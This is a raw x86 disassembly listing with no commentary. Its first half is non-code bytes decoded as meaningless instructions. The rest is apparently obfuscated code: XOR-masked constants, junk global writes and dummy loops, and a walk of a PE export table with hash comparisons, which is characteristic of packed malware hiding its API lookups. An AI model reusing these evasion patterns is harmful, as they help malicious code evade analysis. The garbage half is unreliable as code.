  408073:	sbb    al,0x32
  408075:	mov    bh,0xad
  408077:	out    0xe7,al
  408079:	cmp    dh,bh
  40807b:	imul   ecx,DWORD PTR [edi-0x45],0x2eb0fe7
  408082:	xchg   edx,eax
  408083:	test   BYTE PTR [edi-0xe63b28e],ch
  408089:	gs xchg ebp,eax
  40808b:	pop    ebx
  40808c:	push   edi
  40808d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40808e:	xor    ah,BYTE PTR [edi+0x216daa4d]
  408094:	(bad)  
  408095:	int    0x69
  408097:	(bad)  
  408098:	leave  
  408099:	xor    al,0x43
  40809b:	enter  0xe287,0x8d
  40809f:	orps   xmm6,XMMWORD PTR [eax+edi*2-0x803f2e6]
  4080a7:	dec    edx
  4080a8:	lahf   
  4080a9:	lods   eax,DWORD PTR ds:[esi]
  4080aa:	ins    DWORD PTR es:[edi],dx
  4080ab:	repnz push ebx
  4080ad:	pop    ebx
  4080ae:	daa    
  4080af:	ss es dec eax
  4080b2:	fisubr DWORD PTR [eax+ecx*1+0x32]
  4080b6:	push   0x8fa1baa
  4080bb:	in     eax,0x49
  4080bd:	adc    esi,ebp
  4080bf:	fimul  DWORD PTR [edi]
  4080c1:	arpl   WORD PTR [edi-0x61],sp
  4080c4:	rol    BYTE PTR [esi-0x60],1
  4080c7:	(bad)  
  4080c9:	and    DWORD PTR [eax],ebp
  4080cb:	push   ebx
  4080cc:	js     0x408126
  4080ce:	js     0x4080f4
  4080d0:	and    al,0xb0
  4080d2:	mov    eax,ds:0x8e2ccd81
  4080d7:	add    edi,ebp
  4080d9:	outs   dx,BYTE PTR ds:[esi]
  4080da:	mov    edx,0x23373902
  4080df:	sbb    bl,BYTE PTR [edx-0x184730f3]
  4080e5:	sahf   
  4080e6:	popf   
  4080e7:	push   ebp
  4080e8:	push   es
  4080e9:	lea    esp,[edx]
  4080eb:	dec    DWORD PTR [ebx-0x6f34806]
  4080f1:	ins    BYTE PTR es:[edi],dx
  4080f2:	and    ah,BYTE PTR [ebp+0x1f]
  4080f5:	push   0xffffff83
  4080f7:	stc    
  4080f8:	inc    esi
  4080f9:	ins    DWORD PTR es:[edi],dx
  4080fa:	pop    ebx
  4080fb:	js     0x408125
  4080fd:	pop    ebx
  4080fe:	(bad)  
  4080ff:	mov    ss,WORD PTR [edi-0x7]
  408102:	push   cs
  408103:	add    al,0x87
  408105:	push   cs
  408106:	mov    al,BYTE PTR fs:[esi]
  408109:	xchg   edx,eax
  40810a:	call   0x10bf:0xf719a208
  408111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408112:	imul   edx,DWORD PTR [edi],0xfffffff5
  408115:	push   esp
  408116:	xlat   BYTE PTR ds:[ebx]
  408117:	daa    
  408118:	arpl   WORD PTR [esi+edx*1+0x189427a4],di
  40811f:	lds    esp,FWORD PTR [esi+0x17368631]
  408125:	or     al,0xa1
  408127:	and    ebx,DWORD PTR [edi-0x59]
  40812a:	fwait
  40812b:	pop    edi
  40812c:	xor    DWORD PTR ds:0x4d7e6aa9,ecx
  408132:	push   ss
  408133:	pop    ecx
  408134:	mov    edx,0xab730bf5
  408139:	test   BYTE PTR ds:0xe41fc313,dh
  40813f:	or     eax,0x680f825f
  408144:	mov    al,ds:0xad5f3ec0
  408149:	imul   esp,DWORD PTR [ecx-0x3d691490],0x4c
  408150:	jbe    0x4081ab
  408152:	cdq    
  408153:	xor    dh,BYTE PTR [edx]
  408155:	jno    0x4080e0
  408157:	aam    0x78
  408159:	scas   al,BYTE PTR es:[edi]
  40815a:	rcl    BYTE PTR [ebp+esi*1+0x3faa61b2],1
  408161:	shr    BYTE PTR [ebp-0x67],cl
  408164:	ret    
  408165:	inc    eax
  408166:	lods   eax,DWORD PTR ds:[esi]
  408167:	outs   dx,BYTE PTR ds:[esi]
  408168:	sub    ecx,DWORD PTR [eax-0x2]
  40816b:	jl     0x4081d5
  40816d:	aas    
  40816e:	or     esi,esi
  408170:	mov    ecx,0x86b240
  408175:	xchg   edx,eax
  408176:	in     eax,dx
  408177:	inc    esi
  408178:	xlat   BYTE PTR ds:[ebx]
  408179:	mov    bh,0xba
  40817b:	xchg   esp,eax
  40817c:	mov    ebp,0xc6d01fbf
  408181:	mov    bl,BYTE PTR [ecx+ecx*8-0x7f1770ab]
  408188:	scas   al,BYTE PTR es:[edi]
  408189:	jb     0x40813a
  40818b:	add    bl,0x65
  40818e:	jno    0x408198
  408190:	add    ch,ah
  408192:	adc    al,0x1f
  408194:	adc    BYTE PTR [esi+0x84db7f6],dl
  40819a:	push   ebx
  40819b:	pop    ds
  40819c:	int3   
  40819d:	cmc    
  40819e:	dec    ecx
  40819f:	aaa    
  4081a0:	std    
  4081a1:	push   ecx
  4081a2:	cmp    esp,DWORD PTR [ebp+0x51255cd2]
  4081a8:	out    0x57,eax
  4081aa:	fmul   QWORD PTR [ebx-0x52d364a3]
  4081b0:	sbb    edi,edi
  4081b2:	jae    0x4081a0
  4081b4:	push   ds
  4081b5:	call   FWORD PTR [edx+0x7ef33ee1]
  4081bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081bc:	dec    edi
  4081bd:	cmp    al,0x9a
  4081bf:	pushf  
  4081c0:	mov    ch,0x44
  4081c2:	push   edi
  4081c3:	fstp   QWORD PTR [ebx+0x23]
  4081c6:	sbb    eax,0x2a8066c0
  4081cb:	lods   eax,DWORD PTR ds:[esi]
  4081cc:	lods   al,BYTE PTR ds:[esi]
  4081cd:	mov    cl,0x45
  4081cf:	jmp    0x1881931b
  4081d4:	mov    dl,0xd8
  4081d6:	shr    BYTE PTR [ebx+ebx*1+0x11],0x7
  4081db:	rol    BYTE PTR [eax],0x43
  4081de:	cmp    al,BYTE PTR [edx]
  4081e0:	int3   
  4081e1:	and    DWORD PTR [ecx],ebp
  4081e3:	fsubr  DWORD PTR [eax-0x36]
  4081e6:	sub    ecx,edx
  4081e8:	pusha  
  4081e9:	test   eax,0x7153dd9a
  4081ee:	je     0x4081f1
  4081f0:	dec    ecx
  4081f1:	add    DWORD PTR [edi-0x6373063e],edx
  4081f7:	push   edx
  4081f8:	sub    BYTE PTR ds:0x6ab5087e,al
  4081fe:	mov    ecx,0xeb857fd0
  408203:	mov    ebx,0x32d325d3
  408208:	inc    edi
  408209:	scas   eax,DWORD PTR es:[edi]
  40820a:	pushf  
  40820b:	pop    edi
  40820c:	or     al,0x56
  40820e:	cmp    DWORD PTR [eax],0xda97ad7c
  408214:	scas   eax,DWORD PTR es:[edi]
  408215:	inc    edi
  408216:	pop    eax
  408217:	scas   eax,DWORD PTR es:[edi]
  408218:	sub    edx,edi
  40821a:	pop    esi
  40821b:	scas   al,BYTE PTR es:[edi]
  40821c:	sub    edx,DWORD PTR [edi]
  40821e:	repz jae 0x4081e1
  408221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408222:	adc    ebp,DWORD PTR [ebx+0x5d]
  408225:	pushf  
  408226:	fimul  DWORD PTR [ecx+0x1c9dc977]
  40822c:	dec    esp
  40822d:	rcl    BYTE PTR [edx+ebp*2-0x12],1
  408231:	call   0xc84bff59
  408236:	add    esp,ecx
  408238:	xor    BYTE PTR [edi-0x13d9d79],0xc
  40823f:	push   DWORD PTR [esi-0x34546e3e]
  408245:	ins    DWORD PTR es:[edi],dx
  408246:	aam    0xc
  408248:	int3   
  408249:	loopne 0x40826e
  40824b:	repz xchg edi,eax
  40824d:	popf   
  40824e:	pop    edx
  40824f:	mov    ebx,0x68c5a9b7
  408254:	sub    ch,bh
  408256:	fsubrp st(0),st
  408258:	leave  
  408259:	cs inc ecx
  40825b:	add    eax,0x448334e7
  408260:	add    al,0x43
  408262:	sbb    al,0x99
  408264:	xchg   esp,eax
  408265:	(bad)  
  408266:	mov    eax,0x5bf96a5d
  40826b:	pushf  
  40826c:	rep stos BYTE PTR es:[edi],al
  40826e:	test   DWORD PTR [ebx+0x52acb283],esp
  408274:	in     al,0x1a
  408276:	addr16 out 0x58,eax
  408279:	retf   
  40827a:	mov    ebp,0x7ed6c817
  40827f:	(bad)  
  408281:	mov    al,0x2b
  408283:	ret    0x127e
  408286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408287:	sbb    al,0xbf
  408289:	adc    DWORD PTR [ebp+0x3c],eax
  40828c:	(bad)  
  40828d:	and    BYTE PTR cs:[ecx],bh
  408290:	jle    0x408270
  408292:	aaa    
  408293:	sar    BYTE PTR ds:0x79b8c734,1
  408299:	test   DWORD PTR [ebp+0x1fa6f7be],esp
  40829f:	outs   dx,BYTE PTR ds:[esi]
  4082a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082a1:	fdiv   DWORD PTR [edx]
  4082a3:	pop    eax
  4082a4:	daa    
  4082a5:	jl     0x408241
  4082a7:	xchg   edx,eax
  4082a8:	inc    ecx
  4082a9:	fwait
  4082aa:	add    BYTE PTR [ebx+0x293d9771],dh
  4082b0:	add    al,0x44
  4082b2:	mov    edi,0xcab9d467
  4082b7:	ins    BYTE PTR es:[edi],dx
  4082b8:	xchg   ebp,eax
  4082b9:	loopne 0x40826d
  4082bb:	cmc    
  4082bc:	call   0x5674:0xc68d1ccc
  4082c3:	mov    esi,DWORD PTR [esi+0x1833ee76]
  4082c9:	mov    ?,WORD PTR [edi+0x3d]
  4082cc:	fwait
  4082cd:	cmp    esi,DWORD PTR [esp+esi*4-0x14]
  4082d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082d3:	xor    bl,BYTE PTR [eax+0x36]
  4082d6:	adc    DWORD PTR ds:0x17e31008,ebx
  4082dc:	cdq    
  4082dd:	ret    0xebb2
  4082e0:	(bad)  
  4082e2:	ds gs into 
  4082e5:	sbb    edi,esi
  4082e7:	xchg   ecx,eax
  4082e8:	ja     0x408289
  4082ea:	jbe    0x4082f8
  4082ec:	call   0xf505:0x4f1a856f
  4082f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082f4:	sbb    al,0x23
  4082f6:	push   cs
  4082f7:	adc    edi,ecx
  4082f9:	push   eax
  4082fa:	jne    0x408313
  4082fc:	(bad)  
  4082fd:	fsubr  DWORD PTR [ecx+edi*8]
  408300:	es dec esi
  408302:	imul   edx,ebx,0x86aa2473
  408308:	and    BYTE PTR [edx-0x6e79fd8a],ch
  40830e:	push   0xafc1d3c1
  408313:	jge    0x4082c0
  408315:	mov    ebp,0xaa142f12
  40831a:	sub    eax,0xb601f409
  40831f:	pop    ds
  408320:	and    eax,0xe9a8beed
  408325:	xor    ch,al
  408327:	inc    esi
  408328:	adc    al,0xa4
  40832a:	sahf   
  40832b:	add    eax,0x53d71727
  408330:	ret    
  408331:	imul   ebx,DWORD PTR ds:0x762cfafd,0xffffff93
  408338:	scas   eax,DWORD PTR es:[edi]
  408339:	jl     0x408359
  40833b:	sub    ecx,DWORD PTR [esi-0x59]
  40833e:	adc    dl,cl
  408340:	fdivr  QWORD PTR [edi*2-0x2aeb76f4]
  408347:	test   ecx,eax
  408349:	ins    BYTE PTR es:[edi],dx
  40834a:	addr16 push ebp
  40834c:	xor    BYTE PTR [esi],cl
  40834e:	push   edx
  40834f:	xor    al,0x2c
  408351:	or     dh,BYTE PTR [ebp+0x1847d7d8]
  408357:	sti    
  408358:	and    eax,0xa0d9e85c
  40835d:	or     eax,0x7f206ef3
  408362:	push   eax
  408363:	stc    
  408364:	pop    esi
  408365:	test   eax,0x1f6646f1
  40836a:	sbb    eax,0x12b4a674
  40836f:	arpl   WORD PTR [ebx],cx
  408371:	rol    DWORD PTR [ebp+0x37b06bff],0x22
  408378:	int3   
  408379:	push   cs
  40837a:	fst    QWORD PTR [ebp+0x402b6f91]
  408380:	jb     0x4083ea
  408382:	cmp    eax,0x38d9e97b
  408387:	(bad)  
  408389:	mov    ch,0xbe
  40838b:	es and al,0xae
  40838e:	xchg   edi,eax
  40838f:	xchg   ebp,eax
  408390:	mov    ch,0x3e
  408392:	(bad)  
  408393:	(bad)  
  408394:	pop    edi
  408395:	ss add eax,0xe0706af8
  40839b:	adc    DWORD PTR [ebx-0x611f594b],eax
  4083a1:	gs and eax,ebp
  4083a4:	jno    0x40840f
  4083a6:	lods   al,BYTE PTR ds:[esi]
  4083a7:	add    eax,0x552c5931
  4083ac:	mov    edi,0x828c7857
  4083b1:	xor    eax,0xb97cac02
  4083b6:	adc    DWORD PTR [esi],esi
  4083b8:	xchg   ebp,eax
  4083b9:	test   DWORD PTR [ebp-0x46],0x9233acb6
  4083c0:	or     DWORD PTR [eax-0x7c],esi
  4083c3:	out    dx,al
  4083c4:	pop    ss
  4083c5:	jb     0x40837b
  4083c7:	fsubr  st(0),st
  4083c9:	xlat   BYTE PTR ds:[ebx]
  4083ca:	sub    edi,DWORD PTR [ebp+0x68004fb7]
  4083d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083d1:	lea    edx,[edx-0x52]
  4083d4:	add    eax,0x319e8dc4
  4083d9:	ins    BYTE PTR es:[edi],dx
  4083da:	sbb    eax,DWORD PTR [ebx-0x450d44b2]
  4083e0:	les    ebp,FWORD PTR [eax+0x5aeade2b]
  4083e6:	or     eax,0x97f64166
  4083eb:	xchg   BYTE PTR [eax+esi*2-0x2d],ah
  4083ef:	cmp    cl,dh
  4083f1:	cli    
  4083f2:	inc    esi
  4083f3:	js     0x4083e6
  4083f5:	pop    ecx
  4083f6:	cmp    DWORD PTR [edx+esi*2-0x1bced11b],edx
  4083fd:	pop    ebx
  4083fe:	nop
  4083ff:	hlt    
  408400:	push   edx
  408401:	jg     0x4083c1
  408403:	and    ch,BYTE PTR [ecx+0x7c]
  408406:	sbb    eax,ecx
  408408:	call   0x467d:0x5121cba2
  40840f:	popf   
  408410:	pop    ss
  408411:	lods   al,BYTE PTR ds:[esi]
  408412:	mov    ds:0x9767845d,eax
  408417:	bound  ebx,QWORD PTR [edx]
  408419:	fidiv  WORD PTR [ecx]
  40841b:	fistp  QWORD PTR [ebp+0x4e]
  40841e:	sbb    bh,BYTE PTR [ebx-0x30]
  408421:	inc    ecx
  408422:	loopne 0x4083b9
  408424:	jno    0x4083f2
  408426:	pop    es
  408427:	dec    eax
  408428:	or     DWORD PTR [edi-0x4889bfb1],ebx
  40842e:	call   0x1152:0xb2f61b41
  408435:	push   esp
  408436:	add    DWORD PTR [edi+0x21],edx
  408439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40843a:	adc    DWORD PTR [ebx],eax
  40843c:	(bad)  
  40843d:	cmp    DWORD PTR [esi],edi
  40843f:	out    dx,al
  408440:	int3   
  408441:	es push es
  408443:	mov    DWORD PTR [ecx-0x1646847e],ebp
  408449:	lods   al,BYTE PTR cs:[esi]
  40844b:	ror    DWORD PTR [edi],1
  40844d:	xchg   DWORD PTR [edi],edx
  40844f:	push   ecx
  408450:	cmc    
  408451:	mov    al,0x9b
  408453:	push   0x5
  408455:	into   
  408456:	jmp    0x8f82:0xb9000cd0
  40845d:	ins    BYTE PTR es:[edi],dx
  40845e:	test   DWORD PTR [eax],edx
  408460:	jae    0x408487
  408462:	mov    ebx,DWORD PTR [ebp-0x8]
  408465:	mov    BYTE PTR [edx+ebx*1],al
  408468:	mov    eax,DWORD PTR [ebp-0x40]
  40846b:	mov    edx,DWORD PTR [ebp-0x28]
  40846e:	xor    eax,esi
  408470:	xor    edx,esi
  408472:	add    eax,edi
  408474:	add    edx,edi
  408476:	imul   eax,edx
  408479:	add    eax,DWORD PTR [ebp-0xc]
  40847c:	mov    DWORD PTR [ebp-0xc],eax
  40847f:	mov    eax,DWORD PTR [ebp-0xc]
  408482:	mov    edx,DWORD PTR [ebp-0x18]
  408485:	cmp    edx,eax
  408487:	jb     0x403cec
  40848d:	mov    eax,DWORD PTR [ebp-0x28]
  408490:	mov    edx,DWORD PTR [ebp-0x18]
  408493:	xor    eax,esi
  408495:	add    eax,edi
  408497:	imul   eax,edx
  40849a:	mov    edx,DWORD PTR [ebp-0x1c]
  40849d:	xor    edx,esi
  40849f:	add    edx,edi
  4084a1:	or     eax,edx
  4084a3:	mov    edx,DWORD PTR [ebp-0x20]
  4084a6:	xor    edx,esi
  4084a8:	add    eax,edx
  4084aa:	mov    edx,DWORD PTR [ebp-0x20]
  4084ad:	xor    edx,esi
  4084af:	add    eax,edx
  4084b1:	mov    edx,DWORD PTR [ebp-0x10]
  4084b4:	lea    eax,[eax+edx*1+0x64e5f0]
  4084bb:	jmp    0x4084cf
  4084c0:	mov    eax,DWORD PTR [ebp-0x20]
  4084c3:	mov    edx,DWORD PTR [ebp-0x10]
  4084c6:	xor    eax,esi
  4084c8:	lea    eax,[eax+edx*1+0x3272f8]
  4084cf:	mov    DWORD PTR [ebp-0x10],eax
  4084d2:	jmp    0x403c39
  4084d7:	mov    ebx,DWORD PTR [ebp-0x3c]
  4084da:	mov    eax,DWORD PTR [ebp+0xc]
  4084dd:	xor    eax,esi
  4084df:	lea    ecx,[ecx+eax*1+0x3272f8]
  4084e6:	lea    eax,[ecx-0x3272f8]
  4084ec:	xor    eax,esi
  4084ee:	cmp    eax,0xf89c95b9
  4084f3:	jne    0x403bdd
  4084f9:	dec    DWORD PTR [ebp-0x34]
  4084fc:	jne    0x403bd1
  408502:	mov    eax,DWORD PTR [ebp+0x8]
  408505:	mov    ecx,DWORD PTR [ebp+0xc]
  408508:	mov    edx,DWORD PTR [ebp+0x8]
  40850b:	xor    ecx,esi
  40850d:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f8]
  408514:	xor    eax,esi
  408516:	mov    al,BYTE PTR [eax+ebx*1+0x3272f8]
  40851d:	xor    edx,esi
  40851f:	mov    BYTE PTR [edx+ebx*1+0x3272f8],cl
  408526:	mov    ecx,DWORD PTR [ebp+0xc]
  408529:	xor    ecx,esi
  40852b:	mov    BYTE PTR [ecx+ebx*1+0x3272f8],al
  408532:	mov    eax,DWORD PTR [ebp+0xc]
  408535:	xor    eax,esi
  408537:	add    eax,edi
  408539:	pop    edi
  40853a:	pop    esi
  40853b:	pop    ebx
  40853c:	leave  
  40853d:	ret    0x8
  408540:	sbb    DWORD PTR ds:0x428ec1,0x6a44
  40854a:	xor    eax,eax
  40854c:	ret    
  40854d:	push   ebp
  40854e:	mov    ebp,esp
  408550:	sub    esp,0x38
  408553:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40855a:	adc    DWORD PTR ds:0x428ead,0x214
  408564:	push   ebx
  408565:	sbb    DWORD PTR ds:0x428e39,0x495a
  40856f:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  408576:	add    DWORD PTR ds:0x428ea9,0x428e91
  408580:	mov    eax,DWORD PTR [ebp-0x4]
  408583:	sub    DWORD PTR ds:0x428ea5,0x68fd
  40858d:	push   esi
  40858e:	sub    DWORD PTR ds:0x428e6d,ebx
  408594:	mov    esi,0x75108b1
  408599:	xor    eax,esi
  40859b:	adc    DWORD PTR ds:0x428e95,0x428e2d
  4085a5:	push   edi
  4085a6:	mov    edi,0x3272f8
  4085ab:	sub    DWORD PTR ds:0x428ecd,0x5e85
  4085b5:	add    eax,edi
  4085b7:	sub    DWORD PTR ds:0x428eb5,0x428e59
  4085c1:	mov    DWORD PTR [ebp-0x1c],eax
  4085c4:	mov    eax,DWORD PTR [ebp+0x14]
  4085c7:	test   eax,eax
  4085c9:	je     0x408625
  4085cf:	and    DWORD PTR ds:0x428e41,0x0
  4085d9:	mov    eax,ds:0x428e41
  4085de:	inc    eax
  4085df:	mov    ds:0x428e41,eax
  4085e4:	cmp    DWORD PTR ds:0x428e41,0x1c
  4085eb:	jl     0x408613
  4085f1:	jmp    0x408606
  4085f6:	push   0x428073
  4085fb:	push   0x400000
  408600:	call   DWORD PTR ds:0x42ca24
  408606:	cmp    DWORD PTR ds:0x428e41,0x13
  40860d:	jb     0x4085d9
  408613:	mov    eax,DWORD PTR [ebp+0x14]
  408616:	sbb    DWORD PTR ds:0x428e25,0x208f
  408620:	mov    eax,DWORD PTR [eax]
  408622:	mov    DWORD PTR [ebp-0x1c],eax
  408625:	and    DWORD PTR ds:0x428e4d,edx
  40862b:	mov    eax,DWORD PTR [ebp-0x4]
  40862e:	xor    eax,esi
  408630:	add    eax,edi
  408632:	movzx  ebx,BYTE PTR ds:0x428e6d
  408639:	sub    DWORD PTR ds:0x428eb5,ebx
  40863f:	mov    DWORD PTR [ebp-0x8],eax
  408642:	mov    ebx,DWORD PTR ds:0x428e45
  408648:	sub    DWORD PTR ds:0x428ead,ebx
  40864e:	mov    eax,DWORD PTR [ebp-0xc]
  408651:	xor    eax,esi
  408653:	or     DWORD PTR ds:0x428e25,0x7ae1
  40865d:	add    eax,edi
  40865f:	mov    DWORD PTR [ebp-0x24],eax
  408662:	mov    DWORD PTR ds:0x428eb5,0x1d
  40866c:	cmp    DWORD PTR ds:0x428eb5,0x0
  408673:	je     0x4086a6
  408679:	cmp    DWORD PTR ds:0x428eb5,0x22
  408680:	jb     0x4086a6
  408686:	jmp    0x408696
  40868b:	push   0x35a8
  408690:	call   DWORD PTR ds:0x42ca28
  408696:	mov    eax,ds:0x428eb5
  40869b:	dec    eax
  40869c:	mov    ds:0x428eb5,eax
  4086a1:	jmp    0x40866c
  4086a6:	mov    eax,DWORD PTR [ebp-0x4]
  4086a9:	xor    eax,esi
  4086ab:	sub    ebx,DWORD PTR ds:0x428e35
  4086b1:	add    eax,edi
  4086b3:	mov    DWORD PTR [ebp-0x30],eax
  4086b6:	sbb    eax,0x56d4
  4086bb:	mov    ebx,DWORD PTR [ebp-0x4]
  4086be:	sub    DWORD PTR ds:0x428e55,edi
  4086c4:	xor    ebx,esi
  4086c6:	mov    DWORD PTR ds:0x428e8d,0xdd6
  4086d0:	add    ebx,edi
  4086d2:	mov    eax,DWORD PTR [ebp-0x24]
  4086d5:	sub    eax,edi
  4086d7:	xor    DWORD PTR ds:0x428e2d,0x506a
  4086e1:	lea    ecx,[ebx-0x3272f8]
  4086e7:	or     DWORD PTR ds:0x428e31,0x428e75
  4086f1:	xor    eax,esi
  4086f3:	or     DWORD PTR ds:0x428e41,0x428e89
  4086fd:	xor    ecx,esi
  4086ff:	mov    DWORD PTR ds:0x428e71,0xf9c
  408709:	cmp    ecx,eax
  40870b:	je     0x408990
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	add    DWORD PTR ds:0x428e99,0x428e29
  40871e:	xor    eax,esi
  408720:	sbb    DWORD PTR ds:0x428ead,0x428e4d
  40872a:	add    eax,edi
  40872c:	cmp    ebx,eax
  40872e:	jne    0x408947
  408734:	push   DWORD PTR [ebp+0x8]
  408737:	call   0x423f19
  40873c:	and    DWORD PTR ds:0x428ea1,0x3c45
  408746:	mov    DWORD PTR [ebp-0x14],eax
  408749:	and    DWORD PTR ds:0x428e89,0x0
  408753:	mov    eax,ds:0x428e89
  408758:	inc    eax
  408759:	mov    ds:0x428e89,eax
  40875e:	cmp    DWORD PTR ds:0x428e89,0x23
  408765:	ja     0x408786
  40876b:	jmp    0x408779
  408770:	push   DWORD PTR [ebp-0x24]
  408773:	call   DWORD PTR ds:0x42ca2c
  408779:	cmp    DWORD PTR ds:0x428e89,0x15
  408780:	jb     0x408753
  408786:	mov    eax,DWORD PTR [ebp-0x4]
  408789:	mov    ecx,DWORD PTR [ebp-0x14]
  40878c:	sbb    DWORD PTR ds:0x428e71,0x428e81
  408796:	xor    eax,esi
  408798:	and    DWORD PTR ds:0x428e4d,0x12fb
  4087a2:	add    eax,edi
  4087a4:	cmp    ecx,eax
  4087a6:	mov    DWORD PTR ds:0x428e69,0x743f
  4087b0:	je     0x408a8e
  4087b6:	xor    DWORD PTR ds:0x428e7d,0x5052
  4087c0:	push   DWORD PTR [ebp-0x14]
  4087c3:	push   DWORD PTR [ebp+0x8]
  4087c6:	xor    DWORD PTR ds:0x428ea5,0x6996
  4087d0:	call   0x423fff
  4087d5:	mov    DWORD PTR [ebp-0x14],eax
  4087d8:	mov    eax,DWORD PTR [ebp-0x4]
  4087db:	sub    DWORD PTR ds:0x428e4d,edi
  4087e1:	mov    ecx,DWORD PTR [ebp-0x14]
  4087e4:	sbb    DWORD PTR ds:0x428e35,0x169a
  4087ee:	xor    eax,esi
  4087f0:	sbb    DWORD PTR ds:0x428e31,0x428ebd
  4087fa:	add    eax,edi
  4087fc:	mov    DWORD PTR ds:0x428e99,0xb5
  408806:	cmp    ecx,eax
  408808:	mov    DWORD PTR ds:0x428ebd,0x5868
  408812:	je     0x408a8e
  408818:	mov    DWORD PTR ds:0x428e41,0x51a7
  408822:	mov    eax,DWORD PTR [ebp-0x14]
  408825:	mov    eax,DWORD PTR [eax+0x18]
  408828:	adc    ecx,DWORD PTR ds:0x428e71
  40882e:	mov    DWORD PTR [ebp-0x24],eax
  408831:	and    DWORD PTR ds:0x428e95,0x0
  40883b:	jmp    0x40884d
  408840:	mov    ecx,DWORD PTR ds:0x428e95
  408846:	inc    ecx
  408847:	mov    DWORD PTR ds:0x428e95,ecx
  40884d:	cmp    DWORD PTR ds:0x428e95,0x1a
  408854:	jae    0x408896
  40885a:	cmp    DWORD PTR ds:0x428e95,0xd
  408861:	jge    0x408896
  408867:	jmp    0x408877
  40886c:	push   0x428043
  408871:	call   DWORD PTR ds:0x42ca30
  408877:	cmp    DWORD PTR ds:0x428e95,0xc
  40887e:	jne    0x408891
  408884:	mov    ecx,DWORD PTR ds:0x428e95
  40888a:	inc    ecx
  40888b:	mov    DWORD PTR ds:0x428e95,ecx
  408891:	jmp    0x408840
  408896:	mov    eax,DWORD PTR [ebp-0x14]
  408899:	dec    DWORD PTR ds:0x428ea9
  40889f:	mov    ecx,DWORD PTR [ebp+0x8]
  4088a2:	add    DWORD PTR ds:0x428e71,0x6a43
  4088ac:	add    ecx,DWORD PTR [eax+0x20]
  4088af:	mov    DWORD PTR ds:0x428e95,0x1e
  4088b9:	cmp    DWORD PTR ds:0x428e95,0x0
  4088c0:	je     0x40890b
  4088c6:	cmp    DWORD PTR ds:0x428e95,0xd
  4088cd:	jl     0x40890b
  4088d3:	jmp    0x4088e3
  4088d8:	push   0x635d
  4088dd:	call   DWORD PTR ds:0x42ca38
  4088e3:	cmp    DWORD PTR ds:0x428e95,0xe
  4088ea:	jne    0x4088fb
  4088f0:	mov    eax,ds:0x428e95
  4088f5:	dec    eax
  4088f6:	mov    ds:0x428e95,eax
  4088fb:	mov    eax,ds:0x428e95
  408900:	dec    eax
  408901:	mov    ds:0x428e95,eax
  408906:	jmp    0x4088b9
  40890b:	mov    DWORD PTR [ebp-0x2c],ecx
  40890e:	mov    eax,DWORD PTR [ebp-0x14]
  408911:	mov    ecx,DWORD PTR [ebp+0x8]
  408914:	add    DWORD PTR ds:0x428e75,0x428ed1
  40891e:	add    ecx,DWORD PTR [eax+0x24]
  408921:	or     DWORD PTR ds:0x428e3d,edi
  408927:	mov    DWORD PTR [ebp-0x34],ecx
  40892a:	sbb    ecx,ecx
  40892c:	mov    eax,DWORD PTR [ebp-0x14]
  40892f:	mov    ecx,DWORD PTR [ebp+0x8]
  408932:	add    ecx,DWORD PTR [eax+0x1c]
  408935:	mov    DWORD PTR ds:0x428e9d,0x2455
  40893f:	mov    DWORD PTR [ebp-0x14],ecx
  408942:	jmp    0x408a15
  408947:	add    eax,DWORD PTR ds:0x428e65
  40894d:	mov    eax,DWORD PTR [ebp-0x2c]
  408950:	mov    ecx,DWORD PTR [ebp+0x8]
  408953:	add    ecx,DWORD PTR [eax+ebx*4]
  408956:	mov    DWORD PTR [ebp-0x28],ecx
  408959:	mov    ecx,DWORD PTR ds:0x428ea5
  40895f:	and    DWORD PTR ds:0x428e31,ecx
  408965:	mov    eax,DWORD PTR [ebp-0x4]
  408968:	mov    ecx,DWORD PTR [ebp-0x28]
  40896b:	xor    eax,esi
  40896d:	sub    DWORD PTR ds:0x428ebd,0x6f28
  408977:	add    eax,edi
  408979:	cmp    ecx,eax
  40897b:	mov    DWORD PTR ds:0x428ea9,0x5189
  408985:	je     0x408a15
  40898b:	jmp    0x4089f2
  408990:	mov    eax,DWORD PTR [ebp-0x4]
  408993:	and    ecx,DWORD PTR ds:0x428e65
  408999:	mov    ecx,DWORD PTR [ebp-0x8]
  40899c:	xor    eax,esi
  40899e:	dec    DWORD PTR ds:0x428e8d
  4089a4:	add    eax,edi
  4089a6:	mov    DWORD PTR ds:0x428e99,0x7af8
  4089b0:	cmp    ecx,eax
  4089b2:	mov    eax,DWORD PTR [ebp-0x4]
  4089b5:	mov    DWORD PTR ds:0x428e4d,0x614e
  4089bf:	je     0x408a91
  4089c5:	and    DWORD PTR ds:0x428e79,0x1e6e
  4089cf:	mov    ecx,DWORD PTR [ebp-0x30]
  4089d2:	xor    eax,esi
  4089d4:	add    eax,edi
  4089d6:	mov    DWORD PTR ds:0x428ecd,0x6155
  4089e0:	cmp    ecx,eax
  4089e2:	mov    DWORD PTR ds:0x428e41,0x6810
  4089ec:	je     0x408a9a
  4089f2:	lea    eax,[ebp-0x8]
  4089f5:	xor    DWORD PTR ds:0x428ec1,0x428e25
  4089ff:	push   eax
  408a00:	push   DWORD PTR [ebp-0x28]
  408a03:	sbb    DWORD PTR ds:0x428e71,0x1b8d
  408a0d:	push   DWORD PTR [ebp+0xc]
  408a10:	call   0x40f741
  408a15:	or     DWORD PTR ds:0x428e9d,edx
  408a1b:	mov    eax,DWORD PTR [ebp-0x4]
  408a1e:	sbb    DWORD PTR ds:0x428e5d,edx
  408a24:	mov    ecx,DWORD PTR [ebp-0x8]
  408a27:	xor    DWORD PTR ds:0x428e9d,0xa39
  408a31:	xor    eax,esi
  408a33:	sbb    DWORD PTR ds:0x428e39,0x428e35
